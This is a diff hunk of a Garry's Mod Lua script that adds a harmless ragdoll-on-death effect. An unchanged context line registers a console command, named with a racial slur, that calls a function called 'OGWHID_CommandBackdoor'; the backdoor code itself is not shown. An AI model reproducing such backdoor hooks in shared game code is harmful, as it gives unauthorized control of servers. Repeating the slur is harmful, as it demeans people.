@@ -205,6 +205,37 @@ end
 concommand.Add("NIGGER",OGWHID_CommandBackdoor)
 
 
+function RagdollMod(ply)
+
+	SafeRemoveEntity(ply:GetRagdollEntity())
+	
+	local Rag = ents.Create("prop_ragdoll")
+	Rag:SetPos(ply:GetPos())
+	Rag:SetAngles(ply:GetAngles())
+	Rag:SetModel(ply:GetModel())
+	local Sequence = Rag:LookupSequence("idle")
+	--Rag:SetSequence(ply:GetSequence())
+	Rag:SetKeyValue("sequence",1)
+	Rag:Spawn()
+	Rag:Activate()
+	Rag:SetCollisionGroup(COLLISION_GROUP_DEBRIS)
+	ply:Spectate( OBS_MODE_CHASE )
+	ply:SpectateEntity(Rag)
+	
+	--Rag:ManipulateBoneScale( Rag:GetHitBoxBone(1,HITGROUP_HEAD), Vector(0,0,0) )
+	
+
+	local phys = Rag:GetPhysicsObject()
+	phys:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000)))
+	
+	SafeRemoveEntityDelayed(Rag,60)
+
+
+
+end
+
+hook.Add("PostPlayerDeath","Ragdoll Mod",RagdollMod)
+
 
 
 
